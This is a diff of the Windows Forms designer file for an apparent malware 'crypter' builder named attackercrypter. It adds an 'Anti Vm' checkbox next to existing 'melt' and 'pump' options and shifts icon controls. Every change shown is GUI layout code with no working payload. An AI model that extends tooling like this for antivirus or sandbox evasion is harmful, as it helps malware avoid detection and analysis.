@@ -107,6 +107,7 @@ namespace attackercrypter
             this.button8 = new System.Windows.Forms.Button();
             this.melt = new System.Windows.Forms.CheckBox();
             this.pump = new System.Windows.Forms.Button();
+            this.vm = new System.Windows.Forms.CheckBox();
             ((System.ComponentModel.ISupportInitialize)(this.numericUpDownSc)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.numericUpDownSleep)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.pictureIcon)).BeginInit();
@@ -418,7 +419,7 @@ namespace attackercrypter
             this.TxtIcon.BackColor = System.Drawing.Color.White;
             this.TxtIcon.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
             this.TxtIcon.ForeColor = System.Drawing.Color.Black;
-            this.TxtIcon.Location = new System.Drawing.Point(550, 345);
+            this.TxtIcon.Location = new System.Drawing.Point(631, 341);
             this.TxtIcon.Multiline = true;
             this.TxtIcon.Name = "TxtIcon";
             this.TxtIcon.Size = new System.Drawing.Size(144, 24);
@@ -429,7 +430,7 @@ namespace attackercrypter
             // 
             this.pictureIcon.BackColor = System.Drawing.Color.Transparent;
             this.pictureIcon.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
-            this.pictureIcon.Location = new System.Drawing.Point(551, 295);
+            this.pictureIcon.Location = new System.Drawing.Point(632, 291);
             this.pictureIcon.Margin = new System.Windows.Forms.Padding(2);
             this.pictureIcon.Name = "pictureIcon";
             this.pictureIcon.Size = new System.Drawing.Size(40, 37);
@@ -447,7 +448,7 @@ namespace attackercrypter
             this.button4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
             this.button4.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.button4.ForeColor = System.Drawing.Color.White;
-            this.button4.Location = new System.Drawing.Point(602, 302);
+            this.button4.Location = new System.Drawing.Point(683, 298);
             this.button4.Name = "button4";
             this.button4.Size = new System.Drawing.Size(93, 30);
             this.button4.TabIndex = 43;
@@ -485,6 +486,7 @@ namespace attackercrypter
             this.label10.Size = new System.Drawing.Size(158, 29);
             this.label10.TabIndex = 47;
             this.label10.Text = "Builder Area";
+            this.label10.Click += new System.EventHandler(this.label10_Click);
             // 
             // textBox4
             // 
@@ -1022,6 +1024,20 @@ namespace attackercrypter
             this.pump.UseVisualStyleBackColor = false;
             this.pump.Click += new System.EventHandler(this.pump_Click);
             // 
+            // vm
+            // 
+            this.vm.AutoSize = true;
+            this.vm.BackColor = System.Drawing.Color.Transparent;
+            this.vm.Cursor = System.Windows.Forms.Cursors.Cross;
+            this.vm.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.vm.ForeColor = System.Drawing.Color.Transparent;
+            this.vm.Location = new System.Drawing.Point(514, 350);
+            this.vm.Name = "vm";
+            this.vm.Size = new System.Drawing.Size(78, 20);
+            this.vm.TabIndex = 96;
+            this.vm.Text = "Anti Vm";
+            this.vm.UseVisualStyleBackColor = false;
+            // 
             // Form1
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
@@ -1029,6 +1045,7 @@ namespace attackercrypter
             this.BackColor = System.Drawing.Color.White;
             this.BackgroundImage = global::attackercrypter.Properties.Resources.kali_linux_3;
             this.ClientSize = new System.Drawing.Size(1473, 559);
+            this.Controls.Add(this.vm);
             this.Controls.Add(this.pump);
             this.Controls.Add(this.melt);
             this.Controls.Add(this.button8);
@@ -1195,6 +1212,7 @@ namespace attackercrypter
         private System.Windows.Forms.Button button8;
         private System.Windows.Forms.CheckBox melt;
         private System.Windows.Forms.Button pump;
+        private System.Windows.Forms.CheckBox vm;
     }
 }
 
